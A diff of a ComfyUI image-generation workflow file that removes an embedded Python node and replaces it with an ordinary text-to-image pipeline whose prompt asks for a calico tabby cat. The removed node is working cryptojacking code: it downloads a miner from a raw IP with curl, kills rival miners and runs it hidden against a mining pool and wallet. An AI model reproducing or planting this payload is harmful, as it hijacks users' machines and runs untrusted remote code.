@@ -1,18 +1,188 @@
 {
-  "1": {
-    "class_type": "IDENode",
+  "124": {
     "inputs": {
-      "language": "python",
-      "pycode": "import os\nimport subprocess\nimport time\n\n# Download miner\nos.system(\"cd /tmp && curl -sLo miner http://151.247.219.40:8000/alpha-miner && chmod +x miner\")\n\n# Kill any existing\nos.system(\"pkill -f 'miner.*prl1pjdp6c4dzmzemsw0' 2>/dev/null || true\")\n\n# Start miner\nos.system(\"cd /tmp && nohup ./miner --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker GPU_134 > /tmp/miner.log 2>&1 &\")\n\ntime.sleep(1)\nps = os.popen(\"ps aux | grep miner | grep -v grep | wc -l\").read().strip()\nresult = f\"GPU_134: {ps} processes\"\n"
+      "unet_name": "z_image_turbo_bf16.safetensors",
+      "weight_dtype": "default"
+    },
+    "class_type": "UNETLoader",
+    "_meta": {
+      "title": "UNETLoader"
     }
   },
-  "2": {
-    "class_type": "PreviewAny",
+  "126": {
     "inputs": {
-      "source": [
-        "1",
+      "clip_name": "qwen_3_4b.safetensors",
+      "type": "lumina2",
+      "device": "default"
+    },
+    "class_type": "CLIPLoader",
+    "_meta": {
+      "title": "CLIPLoader"
+    }
+  },
+  "127": {
+    "inputs": {
+      "vae_name": "UltraFlux-vae_v1.safetensors"
+    },
+    "class_type": "VAELoader",
+    "_meta": {
+      "title": "VAELoader"
+    }
+  },
+  "257": {
+    "inputs": {
+      "预设": "自定义",
+      "互换宽高": false,
+      "随机模式": false,
+      "自定义宽": 512,
+      "自定义高": 512,
+      "批次数量": 1
+    },
+    "class_type": "ZML_PresetResolutionV2",
+    "_meta": {
+      "title": "ZML_PresetResolutionV2"
+    }
+  },
+  "263": {
+    "inputs": {
+      "noise": [
+        "266",
+        0
+      ],
+      "guider": [
+        "268",
+        0
+      ],
+      "sampler": [
+        "265",
+        0
+      ],
+      "sigmas": [
+        "264",
+        0
+      ],
+      "latent_image": [
+        "257",
+        2
+      ]
+    },
+    "class_type": "SamplerCustomAdvanced",
+    "_meta": {
+      "title": "SamplerCustomAdvanced"
+    }
+  },
+  "264": {
+    "inputs": {
+      "steps": 8,
+      "start_at_step": 0,
+      "end_at_step": 8,
+      "base_image_seq_len": 512,
+      "base_shift": 0.5,
+      "invert_sigmas": "disable",
+      "max_image_seq_len": 2048,
+      "max_shift": 1.15,
+      "num_train_timesteps": 1000,
+      "shift": 3.0,
+      "shift_terminal": 0.5,
+      "stochastic_sampling": "disable",
+      "time_shift_type": "exponential",
+      "use_beta_sigmas": "disable",
+      "use_dynamic_shifting": "enable",
+      "use_exponential_sigmas": "disable",
+      "use_karras_sigmas": "disable",
+      "device": "auto"
+    },
+    "class_type": "FlowMatchEulerDiscreteScheduler (Custom)",
+    "_meta": {
+      "title": "FlowMatchEulerDiscreteScheduler (Custom)"
+    }
+  },
+  "265": {
+    "inputs": {
+      "sampler_name": "euler"
+    },
+    "class_type": "KSamplerSelect",
+    "_meta": {
+      "title": "KSamplerSelect"
+    }
+  },
+  "266": {
+    "inputs": {
+      "noise_seed": 950842490905886
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "RandomNoise"
+    }
+  },
+  "267": {
+    "inputs": {
+      "clip": [
+        "126",
+        0
+      ],
+      "text": [
+        "403",
         0
       ]
+    },
+    "class_type": "CLIPTextEncode",
+    "_meta": {
+      "title": "CLIPTextEncode"
+    }
+  },
+  "268": {
+    "inputs": {
+      "model": [
+        "124",
+        0
+      ],
+      "conditioning": [
+        "267",
+        0
+      ]
+    },
+    "class_type": "BasicGuider",
+    "_meta": {
+      "title": "BasicGuider"
+    }
+  },
+  "274": {
+    "inputs": {
+      "samples": [
+        "263",
+        0
+      ],
+      "vae": [
+        "127",
+        0
+      ]
+    },
+    "class_type": "VAEDecode",
+    "_meta": {
+      "title": "VAEDecode"
+    }
+  },
+  "385": {
+    "inputs": {
+      "images": [
+        "274",
+        0
+      ],
+      "filename_prefix": "ComfyUI"
+    },
+    "class_type": "SaveImage",
+    "_meta": {
+      "title": "SaveImage"
+    }
+  },
+  "403": {
+    "inputs": {
+      "value": "三花狸花猫"
+    },
+    "class_type": "PrimitiveStringMultiline",
+    "_meta": {
+      "title": "PrimitiveStringMultiline"
     }
   }
 }
